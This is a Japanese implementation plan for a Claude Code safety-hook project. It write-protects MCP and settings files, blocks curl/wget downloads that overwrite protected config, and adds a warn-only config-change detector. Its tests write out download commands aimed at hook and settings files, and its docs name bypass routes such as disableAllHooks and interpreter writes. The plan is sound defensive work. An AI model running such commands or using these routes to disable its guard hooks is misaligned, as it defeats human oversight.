# 設定・フック改変面ハードニング(0.5.0)実装プラン

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `.mcp.json`/`.claude.json` の書込保護、curl/wget 出力フラグによる設定上書きの deny、`ConfigChange` 検知フック(config_guard、警告専用)を追加し 0.5.0 とする。

**Architecture:** 既存の deny 層(`secrets_guard` の write_protected)をデータ駆動ルール追加とターゲット検査(出力フラグの引数のみ照合)で拡張し、予防層が見えない設定変更経路は新規の警告専用フック `config_guard` で事後検知する。スペック: `docs/superpowers/specs/2026-07-20-config-attack-surface-hardening-design.md`。

**Tech Stack:** Python 3.10+(標準ライブラリのみ)、pytest、ruff、uv single-file scripts。

## Global Constraints

- **作業ブランチ**: `feat/config-attack-surface-hardening`(作成済み。スペックがコミット済み)。このブランチ上で実行する。
- **保護ファイルの編集手順(必須)**: `hooks/`・`rules/` 配下は本リポジトリ自身のガード(write_protected)により Edit/Write ツールが deny される。これらのファイルは、パッチスクリプトを `.superpowers/`(gitignore 済み scratch)へ Write ツールで作成し、`python3 .superpowers/<script>.py .` を repo ルートで実行して編集する(`.claude/rules/dogfooding.md`)。`tests/`・`docs/`・`examples/`・ルート直下のファイルは通常の Edit/Write でよい。
- **スクリプト・コミットメッセージに実ホームパス(`/home/<実名>`)や危険コマンドの字面を書かない**(`.claude/rules/no-personal-paths.md`・dogfooding 規約)。テストフィクスチャのパスは `/home/alice` を使う。
- **ruff**: line-length 100、`select = ["E","F","I","W"]`。各タスクのコミット前に `uv run ruff check .` を通す。
- **テストのベースライン**: ブランチ先頭で `uv run pytest -q` は **192 passed**。
- **deny 層の原則**: 今回の変更はすべて deny を強める・検知を足す方向。deny を弱める変更は含まれない(`.claude/rules/guard-rule-changes.md` 原則5)。
- 正規表現は固定幅アンカー・入れ子量化子なし(原則3、ReDoS 安全)。

---

### Task 1: `.mcp.json`・`.claude.json` の write_protected 追加

**Files:**
- Modify: `rules/sensitive_paths.json`(保護ファイル — パッチスクリプト経由)
- Modify: `tests/test_secrets_guard.py`(末尾の blackbox テストの直前に追記)
- Modify: `tests/test_packaging.py:84`(検証キーの追加)

**Interfaces:**
- Consumes: `secrets_guard.evaluate(event, cfg)`(既存)、`rules/sensitive_paths.json` の `write_protected` 配列(既存キー)
- Produces: `write_protected` に `.mcp.json`・`.claude.json` エントリ(basename 一致で全所在に適用)

- [ ] **Step 1: 失敗するテストを書く**

`tests/test_secrets_guard.py` の `def test_deny_survives_enabled_false_blackbox(tmp_path):` の直前に追記:

```python
def test_write_protected_mcp_and_claude_json_denied():
    # MCPサーバ定義・グローバル設定は任意コマンド実行経路になるため書込保護(0.5.0)
    for path in [".mcp.json", "/proj/.mcp.json", "/home/alice/.claude.json"]:
        v = secrets_guard.evaluate(_event("Write", file_path=path), CFG)
        assert v is not None and v["decision"] == "deny", path
    assert secrets_guard.evaluate(_event("Read", file_path=".mcp.json"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command="cat .mcp.json"), CFG) is None


```

- [ ] **Step 2: テストが失敗することを確認**

Run: `uv run pytest tests/test_secrets_guard.py::test_write_protected_mcp_and_claude_json_denied -v`
Expected: FAIL(`v is not None` の assert で `AssertionError: .mcp.json`)

- [ ] **Step 3: ルールを追加(パッチスクリプト経由)**

Write ツールで `.superpowers/patch_rules.py` を作成:

```python
"""rules/sensitive_paths.json の write_protected に .mcp.json / .claude.json を追加する。"""
import sys
from pathlib import Path

repo = Path(sys.argv[1])
p = repo / "rules" / "sensitive_paths.json"
text = p.read_text(encoding="utf-8")
old = '  "write_protected": [\n    ".claude-hooks.json", "claude-hooks.json",\n'
new = old + '    ".mcp.json", ".claude.json",\n'
assert text.count(old) == 1, "アンカーが一意に見つかりません"
p.write_text(text.replace(old, new), encoding="utf-8")
print("patched: rules/sensitive_paths.json")
```

Run: `python3 .superpowers/patch_rules.py .`
Expected: `patched: rules/sensitive_paths.json`

- [ ] **Step 4: テストが通ることを確認**

Run: `uv run pytest tests/test_secrets_guard.py -v`
Expected: 全件 PASS(既存の `test_write_protected_does_not_block_unrelated_settings` — `.vscode/settings.json` を誤 deny しないこと — も引き続き PASS であること)

- [ ] **Step 5: packaging テストの検証キーに write_protected を追加**

`tests/test_packaging.py` を Edit:

```python
# old
            for key in ("protected", "protected_dirs", "allow"):
# new
            for key in ("protected", "protected_dirs", "allow", "write_protected"):
```

Run: `uv run pytest tests/test_packaging.py -q && uv run ruff check .`
Expected: 全件 PASS / All checks passed!

- [ ] **Step 6: コミット**

```bash
git add rules/sensitive_paths.json tests/test_secrets_guard.py tests/test_packaging.py
git commit -m "feat(secrets_guard): .mcp.json/.claude.jsonをwrite_protectedに追加

MCPサーバ定義のcommandは任意コマンド実行経路であり、フック定義と
同格の改変標的のため(spec 2026-07-20 #1)。読取は従来どおり許可。

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 2: curl/wget 出力フラグの書込検査

**Files:**
- Modify: `hooks/pre_tool_use/secrets_guard.py`(保護ファイル — パッチスクリプト経由)
- Modify: `tests/test_secrets_guard.py`(Task 1 で追加した関数の直後に追記)

**Interfaces:**
- Consumes: `_looks_like_path(token)`, `check_write_protected(path_str, cfg)`, `_SEGMENT_RE`, `_MUTATION_RE`, `_mutation_target_tokens(seg)`(いずれも `secrets_guard.py` 既存)
- Produces: `_download_output_tokens(seg: str) -> list[str]` — セグメント内の curl/wget 出力フラグの引数トークンのみを返す。`evaluate()` の Bash 分岐でセグメントごとに呼ばれ、既存の write_protected 照合へ合流する

- [ ] **Step 1: 失敗するテストを書く**

`tests/test_secrets_guard.py` の `test_write_protected_mcp_and_claude_json_denied` の直後に追記:

```python
def test_download_output_to_protected_denied():
    for cmd in [
        "curl -o .claude-hooks.json https://example.com/payload",
        "curl -fsSLo .mcp.json https://example.com/payload",
        "curl -o.claude-hooks.json https://example.com/payload",
        "curl --output .claude/settings.json https://example.com/payload",
        "wget -O .claude/settings.json https://example.com/payload",
        "wget --output-document=.mcp.json https://example.com/payload",
        "git pull && curl -o .claude-hooks.json https://example.com/payload",
    ]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_download_read_and_unprotected_output_allowed():
    for cmd in [
        "curl https://example.com/repo/.claude/settings.json",
        "curl -o /tmp/page.html https://example.com/",
        "curl --output result.json https://example.com/api",
        "curl -O https://example.com/file.tar.gz",
        "wget -O - https://example.com/notes.txt",
        "wget https://example.com/file.tar.gz",
    ]:
        assert secrets_guard.evaluate(_event("Bash", command=cmd), CFG) is None, cmd


```

- [ ] **Step 2: テストが失敗することを確認**

Run: `uv run pytest tests/test_secrets_guard.py::test_download_output_to_protected_denied -v`
Expected: FAIL(deny 側の最初のコマンドで `AssertionError`)。`test_download_read_and_unprotected_output_allowed` は実装前でも PASS する(現状なにも検査していないため)— これは誤ブロック側の回帰基準として実装後も PASS を維持する。

- [ ] **Step 3: 実装(パッチスクリプト経由)**

Write ツールで `.superpowers/patch_secrets_guard.py` を作成:

```python
"""secrets_guard.py に curl/wget 出力フラグの書込検査を追加する。"""
import sys
from pathlib import Path

repo = Path(sys.argv[1])
p = repo / "hooks" / "pre_tool_use" / "secrets_guard.py"
text = p.read_text(encoding="utf-8")

DEFS = '''
_DOWNLOAD_TOOL_RE = re.compile(r"\\b(curl|wget)\\b")
_DOWNLOAD_LONG_FLAGS = ("--output", "--output-document")
# 短縮フラグ: curl は -o(バンドル末尾・密着引数 -oFILE を含む)、wget は -O
_CURL_SHORT_OUT_RE = re.compile(r"^-[A-Za-z]*o(\\S*)$")
_WGET_SHORT_OUT_RE = re.compile(r"^-[A-Za-z]*O(\\S*)$")
'''

FUNC = '''

def _download_output_tokens(seg: str) -> list[str]:
    """curl/wget の出力フラグ(-o/-O/--output/--output-document)の引数だけを収集する。

    ダウンロードによるファイル書込はシェルの変異キーワードを伴わないため、
    _mutation_target_tokens とは別に出力フラグの引数トークンのみを対象とする
    (URL等の無関係トークンを巻き込まない)。
    """
    m = _DOWNLOAD_TOOL_RE.search(seg)
    if not m:
        return []
    short_re = _CURL_SHORT_OUT_RE if m.group(1) == "curl" else _WGET_SHORT_OUT_RE
    try:
        toks = shlex.split(seg)
    except ValueError:
        toks = seg.split()
    out: list[str] = []
    for i, t in enumerate(toks):
        if t in _DOWNLOAD_LONG_FLAGS and i + 1 < len(toks):
            out.append(toks[i + 1])
            continue
        if t.startswith("--"):
            for flag in _DOWNLOAD_LONG_FLAGS:
                if t.startswith(flag + "="):
                    out.append(t.split("=", 1)[1])
            continue
        sm = short_re.match(t)
        if sm:
            if sm.group(1):
                out.append(sm.group(1))
            elif i + 1 < len(toks):
                out.append(toks[i + 1])
    return out
'''

KEYWORD_BLOCK = (
    '_KEYWORD_MUTATOR_RE = re.compile(\n'
    '    r"(?:\\btee\\b|\\bsed\\s+(?:-i\\b|--in-place\\b)|\\brm\\b|\\bmv\\b|\\bcp\\b"\n'
    '    r"|\\btruncate\\b|\\bdd\\b|\\binstall\\b|\\bln\\b)"\n'
    ')\n'
)

pairs = [
    (KEYWORD_BLOCK, KEYWORD_BLOCK + DEFS),
    (
        '\n\ndef _looks_like_path(token: str) -> bool:',
        FUNC + '\n\ndef _looks_like_path(token: str) -> bool:',
    ),
    (
        '        for seg in _SEGMENT_RE.split(command):\n'
        '            if not _MUTATION_RE.search(seg):\n'
        '                continue\n'
        '            seg_tokens = _mutation_target_tokens(seg)\n',
        '        for seg in _SEGMENT_RE.split(command):\n'
        '            seg_tokens = _download_output_tokens(seg)\n'
        '            if _MUTATION_RE.search(seg):\n'
        '                seg_tokens.extend(_mutation_target_tokens(seg))\n',
    ),
]
for old, new in pairs:
    assert text.count(old) == 1, f"アンカーが一意に見つかりません: {old[:50]!r}"
    text = text.replace(old, new)
p.write_text(text, encoding="utf-8")
print("patched: hooks/pre_tool_use/secrets_guard.py")
```

注: アンカーは `_KEYWORD_MUTATOR_RE` の定義ブロック全体(変数名を含む)。類似の `_MUTATION_RE` 定義は先頭行が異なる(`(?:>|>>|` を含む)ため一意性が保たれる。

Run: `python3 .superpowers/patch_secrets_guard.py .`
Expected: `patched: hooks/pre_tool_use/secrets_guard.py`

- [ ] **Step 4: テストが通ることを確認**

Run: `uv run pytest tests/test_secrets_guard.py -v && uv run ruff check .`
Expected: 全件 PASS(deny 側 7 コマンド・素通り側 6 コマンドとも)/ All checks passed!

- [ ] **Step 5: コミット**

```bash
git add hooks/pre_tool_use/secrets_guard.py tests/test_secrets_guard.py
git commit -m "feat(secrets_guard): curl/wget出力フラグによる保護ファイル上書きをdeny

出力フラグ(-o/--output/-O/--output-document、バンドル末尾・密着・=連結
を含む)の引数トークンのみを照合し、ダウンロードによる設定/フック
ファイルの上書きを塞ぐ(spec 2026-07-20 #2)。URL等の無関係トークンは
照合しないため、読取用途のcurlや/tmpへの保存は妨げない。

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 3: config_guard フック本体

**Files:**
- Create: `hooks/config_change/config_guard.py`(保護ディレクトリ — パッチスクリプト経由)
- Modify: `hooks/lib/config.py:35`(保護ファイル — 同スクリプトで DEFAULTS に追記)
- Test: `tests/test_config_guard.py`(新規)

**Interfaces:**
- Consumes: `hook_io.read_event()`, `hook_io.finalize(out, cfg_all)`, `hook_io.fail_open(name, exc)`, `config.load_config(cwd)`(いずれも `hooks/lib/` 既存)
- Produces: `config_guard.main()`(スクリプトエントリ)、モジュール定数 `_USER_SETTINGS: Path`(テストが monkeypatch する)、設定キー `config_guard.enabled`(既定 `True`、`config.DEFAULTS` に追加)

- [ ] **Step 1: 失敗するテストを書く**

Write ツールで `tests/test_config_guard.py` を新規作成:

```python
import io
import json

import pytest
from helpers import load_hook
from lib import config

config_guard = load_hook("config_change/config_guard.py")


def _run(monkeypatch, event, capsys):
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(event)))
    with pytest.raises(SystemExit):
        config_guard.main()
    out = capsys.readouterr().out.strip()
    return json.loads(out) if out else None


def _isolate(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "GLOBAL_CONFIG_PATH", tmp_path / "none.json")
    monkeypatch.setattr(config_guard, "_USER_SETTINGS", tmp_path / "user-settings.json")


def test_notifies_on_config_change(monkeypatch, tmp_path, capsys):
    _isolate(monkeypatch, tmp_path)
    event = {"hook_event_name": "ConfigChange", "source": "project_settings",
             "cwd": str(tmp_path)}
    out = _run(monkeypatch, event, capsys)
    assert out is not None
    assert "設定ファイルが変更されました" in out["systemMessage"]
    assert "project_settings" in out["systemMessage"]


def test_unknown_source_still_notifies(monkeypatch, tmp_path, capsys):
    _isolate(monkeypatch, tmp_path)
    event = {"hook_event_name": "ConfigChange", "cwd": str(tmp_path)}
    out = _run(monkeypatch, event, capsys)
    assert "不明" in out["systemMessage"]


def test_warns_when_disable_all_hooks_set(monkeypatch, tmp_path, capsys):
    _isolate(monkeypatch, tmp_path)
    settings = tmp_path / ".claude" / "settings.json"
    settings.parent.mkdir()
    settings.write_text('{"disableAllHooks": true}', encoding="utf-8")
    event = {"hook_event_name": "ConfigChange", "source": "project_settings",
             "cwd": str(tmp_path)}
    out = _run(monkeypatch, event, capsys)
    assert "disableAllHooks" in out["systemMessage"]


def test_no_disable_warning_without_flag(monkeypatch, tmp_path, capsys):
    _isolate(monkeypatch, tmp_path)
    settings = tmp_path / ".claude" / "settings.json"
    settings.parent.mkdir()
    settings.write_text('{"disableAllHooks": false}', encoding="utf-8")
    event = {"hook_event_name": "ConfigChange", "source": "project_settings",
             "cwd": str(tmp_path)}
    out = _run(monkeypatch, event, capsys)
    assert "disableAllHooks" not in out["systemMessage"]


def test_enabled_false_disables(monkeypatch, tmp_path, capsys):
    # config_guard は警告専用(deny層ではない)ため enabled:false で完全に無効化できる
    _isolate(monkeypatch, tmp_path)
    (tmp_path / ".claude-hooks.json").write_text(
        '{"config_guard": {"enabled": false}}', encoding="utf-8"
    )
    event = {"hook_event_name": "ConfigChange", "source": "user_settings",
             "cwd": str(tmp_path)}
    assert _run(monkeypatch, event, capsys) is None


def test_broken_settings_json_ignored(monkeypatch, tmp_path, capsys):
    _isolate(monkeypatch, tmp_path)
    settings = tmp_path / ".claude" / "settings.json"
    settings.parent.mkdir()
    settings.write_text("{broken", encoding="utf-8")
    event = {"hook_event_name": "ConfigChange", "source": "project_settings",
             "cwd": str(tmp_path)}
    out = _run(monkeypatch, event, capsys)
    assert "設定ファイルが変更されました" in out["systemMessage"]
```

- [ ] **Step 2: テストが失敗することを確認**

Run: `uv run pytest tests/test_config_guard.py -v`
Expected: collection error(`FileNotFoundError: hooks/config_change/config_guard.py` — `load_hook` がファイル不在で失敗)

- [ ] **Step 3: フック本体と DEFAULTS を実装(パッチスクリプト経由)**

Write ツールで `.superpowers/create_config_guard.py` を作成:

```python
"""config_guard.py の新規作成と config.DEFAULTS への config_guard 追加。"""
import sys
from pathlib import Path

repo = Path(sys.argv[1])

SOURCE = '''#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.10"
# ///
"""セッション中の設定変更(ConfigChange)を可視化する。検知専用でブロックしない。

write_protected(予防層)を素通りする経路(インタプリタレベルの書込・外部プロセス等)で
設定が変更されても、変更の発生自体をユーザーへ必ず通知する検知層。ブロックしないのは、
disableAllHooks という正規の解除手段や人間自身の設定編集を妨げないため(warn→block の
段階導入原則。docs/best-practices.md セクション6.3)。
"""
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib import config, hook_io  # noqa: E402

# 変更元識別子のフィールド名は公式ドキュメントに明記が無いため、候補を防御的に読む
_SOURCE_KEYS = ("source", "config_source", "matcher")

_USER_SETTINGS = Path.home() / ".claude" / "settings.json"
_PROJECT_SETTINGS = (
    Path(".claude") / "settings.json",
    Path(".claude") / "settings.local.json",
)


def _change_source(event: dict) -> str:
    for key in _SOURCE_KEYS:
        value = event.get(key)
        if isinstance(value, str) and value:
            return value
    return "不明"


def _disable_all_hooks_active(cwd: str | None) -> bool:
    base = Path(cwd or ".")
    candidates = [_USER_SETTINGS] + [base / p for p in _PROJECT_SETTINGS]
    for path in candidates:
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError, UnicodeDecodeError):
            continue
        if isinstance(data, dict) and data.get("disableAllHooks") is True:
            return True
    return False


def main() -> None:
    event = hook_io.read_event()
    cfg_all = config.load_config(event.get("cwd"))
    if not cfg_all.get("config_guard", {}).get("enabled", True):
        hook_io.finalize(None, cfg_all)
    try:
        msg = (
            "[safe-dev-hooks] セッション中に設定ファイルが変更されました"
            f"(変更元: {_change_source(event)})。意図した変更か確認してください。"
        )
        if _disable_all_hooks_active(event.get("cwd")):
            msg += (
                "\\n[safe-dev-hooks] 警告: disableAllHooks が有効です。"
                "全Hooks(本ガードを含む)が無効化されます。"
            )
        hook_io.finalize({"systemMessage": msg}, cfg_all)
    except Exception as exc:  # 検知専用のため fail-open
        hook_io.fail_open("config_guard", exc)


if __name__ == "__main__":
    main()
'''

dest = repo / "hooks" / "config_change" / "config_guard.py"
dest.parent.mkdir(parents=True, exist_ok=True)
dest.write_text(SOURCE, encoding="utf-8")
print("created: hooks/config_change/config_guard.py")

cfg_path = repo / "hooks" / "lib" / "config.py"
text = cfg_path.read_text(encoding="utf-8")
old = '    "audit_log": {"enabled": True, "path": ".claude/logs"},\n'
new = old + '    "config_guard": {"enabled": True},\n'
assert text.count(old) == 1, "アンカーが一意に見つかりません"
cfg_path.write_text(text.replace(old, new), encoding="utf-8")
print("patched: hooks/lib/config.py")
```

Run: `python3 .superpowers/create_config_guard.py .`
Expected: `created:` と `patched:` の2行

- [ ] **Step 4: テストが通ることを確認**

Run: `uv run pytest tests/test_config_guard.py tests/test_config.py -v && uv run ruff check .`
Expected: 全件 PASS(config_guard 6件 + 既存 config テスト)/ All checks passed!

- [ ] **Step 5: 実機スモーク(スクリプト単体起動)**

Run: `echo '{"hook_event_name":"ConfigChange","source":"project_settings","cwd":"/tmp"}' | uv run hooks/config_change/config_guard.py`
Expected: `{"systemMessage": "[safe-dev-hooks] セッション中に設定ファイルが変更されました(変更元: project_settings)。意図した変更か確認してください。"}` の1行(exit 0)

- [ ] **Step 6: コミット**

```bash
git add hooks/config_change/config_guard.py hooks/lib/config.py tests/test_config_guard.py
git commit -m "feat(config_guard): ConfigChange検知フックを追加(警告専用)

write_protectedが見えない経路(インタプリタ書込・外部プロセス・人間の
編集)での設定変更をsystemMessageで可視化し、disableAllHooks有効化時は
追加警告する(spec 2026-07-20 #3)。ブロックしない設計判断はスペック
参照。設定キー config_guard.enabled(警告専用のためfalseで無効化可)。

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 4: ConfigChange イベントの配線

**Files:**
- Modify: `hooks/hooks.json`(保護ファイル — パッチスクリプト経由)
- Modify: `examples/settings.full.json:59-61`
- Modify: `tests/test_packaging.py:57-59`(配線イベント集合)

**Interfaces:**
- Consumes: `hooks/config_change/config_guard.py`(Task 3)、`hooks/audit/audit_log.py`(既存)
- Produces: `hooks.json` の `ConfigChange` イベント配線(config_guard 同期 + audit_log 非同期)

- [ ] **Step 1: 失敗するテストを書く**

`tests/test_packaging.py` の `test_hooks_json_wires_all_events` を Edit:

```python
# old
    assert set(h["hooks"]) == {
        "PreToolUse", "PostToolUse", "SessionStart", "SessionEnd", "Stop", "Notification",
    }
# new
    assert set(h["hooks"]) == {
        "PreToolUse", "PostToolUse", "SessionStart", "SessionEnd", "Stop", "Notification",
        "ConfigChange",
    }
```

Run: `uv run pytest tests/test_packaging.py::test_hooks_json_wires_all_events -v`
Expected: FAIL(集合不一致)

- [ ] **Step 2: hooks.json を配線(パッチスクリプト経由)**

Write ツールで `.superpowers/patch_hooks_json.py` を作成:

```python
"""hooks.json に ConfigChange イベントを配線する。"""
import json
import sys
from pathlib import Path

repo = Path(sys.argv[1])
p = repo / "hooks" / "hooks.json"
text = p.read_text(encoding="utf-8")
old = (
    '    "Notification": [\n'
    '      {"hooks": [{"type": "command", "command": "uv run '
    '\\"${CLAUDE_PLUGIN_ROOT}/hooks/notification/notify.py\\"", "timeout": 10}]}\n'
    '    ]\n'
)
new = (
    '    "Notification": [\n'
    '      {"hooks": [{"type": "command", "command": "uv run '
    '\\"${CLAUDE_PLUGIN_ROOT}/hooks/notification/notify.py\\"", "timeout": 10}]}\n'
    '    ],\n'
    '    "ConfigChange": [\n'
    '      {"hooks": [\n'
    '        {"type": "command", "command": "uv run '
    '\\"${CLAUDE_PLUGIN_ROOT}/hooks/config_change/config_guard.py\\"", "timeout": 10},\n'
    '        {"type": "command", "command": "uv run '
    '\\"${CLAUDE_PLUGIN_ROOT}/hooks/audit/audit_log.py\\"", "timeout": 10, "async": true}\n'
    '      ]}\n'
    '    ]\n'
)
assert text.count(old) == 1, "アンカーが一意に見つかりません"
p.write_text(text.replace(old, new), encoding="utf-8")
json.loads((repo / "hooks" / "hooks.json").read_text(encoding="utf-8"))  # JSON妥当性検証
print("patched: hooks/hooks.json")
```

Run: `python3 .superpowers/patch_hooks_json.py .`
Expected: `patched: hooks/hooks.json`

- [ ] **Step 3: examples/settings.full.json に同じ配線を追加**

`examples/settings.full.json` を Edit(手動導入スニペットは `hooks.json` をミラーする。パス形式が `$HOME/safe-dev-hooks` である点だけ異なる):

```json
// old(ファイル末尾付近)
    "Notification": [
      {"hooks": [{"type": "command", "command": "uv run \"$HOME/safe-dev-hooks/hooks/notification/notify.py\"", "timeout": 10}]}
    ]
  }
}
// new
    "Notification": [
      {"hooks": [{"type": "command", "command": "uv run \"$HOME/safe-dev-hooks/hooks/notification/notify.py\"", "timeout": 10}]}
    ],
    "ConfigChange": [
      {
        "hooks": [
          {"type": "command", "command": "uv run \"$HOME/safe-dev-hooks/hooks/config_change/config_guard.py\"", "timeout": 10},
          {"type": "command", "command": "uv run \"$HOME/safe-dev-hooks/hooks/audit/audit_log.py\"", "timeout": 10, "async": true}
        ]
      }
    ]
  }
}
```

- [ ] **Step 4: テスト全体が通ることを確認**

Run: `uv run pytest -q && uv run ruff check .`
Expected: **201 passed** / All checks passed!(192 + Task1: 1 + Task2: 2 + Task3: 6)

- [ ] **Step 5: コミット**

```bash
git add hooks/hooks.json examples/settings.full.json tests/test_packaging.py
git commit -m "feat: config_guard/audit_logをConfigChangeイベントへ配線

ConfigChangeは新しめのイベントのため、未対応のClaude Codeでは単に
発火しない(他フックへ影響なし)。examplesの手動導入スニペットも同期。

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 5: ドキュメント更新

**Files:**
- Create: `docs/hooks/config_guard.md`
- Modify: `docs/hooks/secrets_guard.md`(write_protected 対象・Bash 検査・既知の限界)
- Modify: `docs/security-model.md`(§3・限界#9・fail-open 一覧)
- Modify: `docs/configuration.md`(config_guard キー・リファレンス一覧)
- Modify: `docs/hooks/audit_log.md:9`(イベント一覧)
- Modify: `README.md` / `README.ja.md`(9本化・テーブル)

**Interfaces:**
- Consumes: Task 1〜4 の実装内容(記述はスペック `docs/superpowers/specs/2026-07-20-config-attack-surface-hardening-design.md` と一致させる)
- Produces: なし(ドキュメントのみ)

- [ ] **Step 1: `docs/hooks/config_guard.md` を新規作成**

```markdown
# config_guard

## 目的

セッション中に設定ファイル(ユーザー/プロジェクトの `settings.json`、`settings.local.json`、managed policy、skills)が変更されたことをユーザーへ通知する**検知専用**のフック。[secrets_guard](secrets_guard.md) の write_protected(予防層)を素通りする経路 — インタプリタレベルの書込、Claude Code の外で動く別プロセス、人間の手による編集 — で設定が変わっても、変更の発生自体を必ず可視化する。

## 対象イベント / matcher

- イベント: `ConfigChange`(設定ファイルの変更時に発火)
- matcher: なし(全ての変更元 — `user_settings` / `project_settings` / `local_settings` / `policy_settings` / `skills` — を対象)
- timeout: 10秒(`hooks/hooks.json`)
- 同イベントで `audit_log` も配線されており、変更はJSONL監査ログにも記録される

> **注**: `ConfigChange` は比較的新しいイベントのため、古いClaude Codeでは発火しない。その場合フックは単に呼ばれないだけで、他のフックの動作には影響しない。

## 動作

1. 変更元(イベント入力の `source` 等。フィールド名は公式に未文書化のため複数候補を防御的に読む)を含む `systemMessage` で「設定が変更された」ことを通知する。
2. 変更後のユーザー/プロジェクト設定に `disableAllHooks: true` が含まれる場合、「全Hooks(本ガードを含む)が無効化される」旨の警告を追加する。

## ブロックしない理由(設計判断)

`ConfigChange` はexit 2やJSON出力で変更の適用自体をブロックできるが、config_guard は意図的に**警告のみ**とする:

- `disableAllHooks` は本Hooks集が公式に認める唯一のHooks完全無効化手段([security-model](../security-model.md) §2)であり、これをブロックすると正規の解除経路と矛盾する。
- `ConfigChange` は人間自身がエディタで行った設定変更でも発火し、フックからは変更者を区別できない。ブロックすると正当な設定作業を止めてしまう(過剰検知は安全側ではない — `.claude/rules/guard-rule-changes.md` 原則2)。
- 新しい検出はまず警告として観測し、誤検知の実態を確認してから強化する(warn→block の段階導入。[best-practices](../best-practices.md) §6.3)。

つまり config_guard は「予防(write_protected)を抜けた変更を、事後すぐに人間へ知らせる」検知層であり、deny層ではない。

## 設定キー

| キー | 既定値 | 説明 |
|---|---|---|
| `config_guard.enabled` | `true` | `false` で無効化できる。警告専用(deny層ではない)ため、他のガードと異なり enabled:false が完全に有効 |

## フェイルモード

fail-open。フック自体の異常時はツール実行・設定変更を妨げず、`systemMessage` で検査スキップを通知する。
```

- [ ] **Step 2: `docs/hooks/secrets_guard.md` を更新**

3箇所を Edit する。

(a) write_protected 対象リスト(「対象(`rules/sensitive_paths.json` の `write_protected`): …」で始まる行)を以下へ置換:

```markdown
- 対象(`rules/sensitive_paths.json` の `write_protected`):
  - `.claude-hooks.json` / `claude-hooks.json`(本Hooks集の設定ファイル。所在を問わない)
  - `.mcp.json` / `.claude.json`(MCPサーバ定義・Claude Codeグローバル設定。MCPサーバの `command` は任意コマンド実行経路になるため。所在を問わない)
  - `.claude/` 配下の `settings.json` / `settings.local.json`(裸の `settings.json` は対象外 — `.vscode/settings.json` 等の正当な編集を妨げない)
  - このインストール自身の `hooks/`/`rules/` ディレクトリ配下すべて(実パスを解決して判定。`hooks/hooks.json` もこれに含まれる)
```

(b) Bash 検査の説明(「`Bash` はコマンド中に変異キーワード…」の箇条書き)の直後に追加:

```markdown
- `Bash` はさらに `curl`/`wget` の**出力フラグ**(`-o`(バンドル末尾・密着引数 `-oFILE` を含む)/ `--output`、wgetの `-O` / `--output-document`、`=` 連結形式を含む)の引数トークンも検査する。ダウンロードによる保護ファイルの上書き(例: 設定ファイルを外部から取得して置き換える操作)を塞ぐもので、出力フラグの引数のみを照合するため、URL等の無関係トークンや読取用途の `curl` を巻き込まない
```

(c) 既知の限界: インタプリタ書込の段落中「既知の変異キーワードを含むセグメントのみを対象にしている」を「既知の変異キーワード、および `curl`/`wget` の出力フラグを対象にしている」へ修正し、段落末尾に「(この経路の変更は [config_guard](config_guard.md) の検知層が補完する)」を追記。さらに新しい限界を1件追加:

```markdown
- **ダウンロード書込の検査は明示的な出力フラグのみが対象**: `curl -O URL`(リモート名で保存)や裸の `wget URL` のように、書込先ファイル名がURL側から決まる形式は、出力フラグの引数が存在しないため検査対象にならない。カレントディレクトリへサーバ由来の名前で書き込まれるこれらの形式で保護ファイルを狙い撃ちするにはURL側の細工が必要であり、明示的な出力フラグの検査で主要経路は塞がれていると判断した。
```

- [ ] **Step 3: `docs/security-model.md` を更新**

3箇所を Edit する。

(a) §3「`disableAllHooks` やHook設定削除による無効化を防げない」の段落末尾に追記:

```markdown
ただし [config_guard](hooks/config_guard.md)(`ConfigChange` イベントの検知層)が、セッション中の設定変更の発生と `disableAllHooks` の有効化を `systemMessage` でユーザーへ通知する — 防止はできないが、黙って無効化されることはない(通知の直後までは有効なため)。
```

(b) §4-9(write_protected の限界)の対象列挙を「(a) Hook自身の設定ファイル…、(b) MCPサーバ定義・Claude Codeグローバル設定(`.mcp.json`・`.claude.json` — MCPサーバの `command` は任意コマンド実行経路になるため)、(c) このインストール自身の `hooks/`・`rules/` ディレクトリ、(d) 利用者が追加したパス」の4項目に改める。検査手段の列挙に「および `curl`/`wget` の出力フラグ(`-o`/`--output`/`-O`/`--output-document` — ダウンロードによる設定ファイル上書き)」を追加し、段落末尾に「この素通り経路によるClaude Code設定の変更は、[config_guard](hooks/config_guard.md)(`ConfigChange` 検知層)が事後に可視化する。」を追記。

(c) §5 fail-open の対象列挙 `` `secrets_scan`、`audit_log` `` を `` `secrets_scan`、`config_guard`、`audit_log` `` へ変更。

- [ ] **Step 4: `docs/configuration.md`・`docs/hooks/audit_log.md` を更新**

`docs/configuration.md`: 全スキーマ例の `"audit_log": {…},` と `"notify": {…}` の間に追加し、末尾のリファレンス一覧に `[config_guard](hooks/config_guard.md)` を追加:

```json
  "config_guard": {
    "enabled": true                          // セッション中の設定変更(ConfigChange)を通知。警告専用のためfalseで無効化可
  },
```

`docs/hooks/audit_log.md` のイベント一覧を Edit:

```markdown
- イベント: `PreToolUse` / `PostToolUse` / `SessionStart` / `SessionEnd` / `Stop` / `ConfigChange`
```

- [ ] **Step 5: README 日英を更新**

`README.ja.md`: 冒頭の「Hooks 8本」→「Hooks 9本」、導入節「これで8本すべて」→「これで9本すべて」。Hook一覧テーブルの secrets_guard 行の書込保護の括弧内を「(`.claude-hooks.json`、`.claude/settings.json`、`.mcp.json`、`.claude.json`、導入済みの `hooks/`・`rules/`)」とし、末尾に「— シェル変異に加え `curl`/`wget` の出力フラグも検査。読取は許可。」と追記。audit_log 行のイベント列へ `ConfigChange` を追加。notify 行の直後にテーブル行を追加:

```markdown
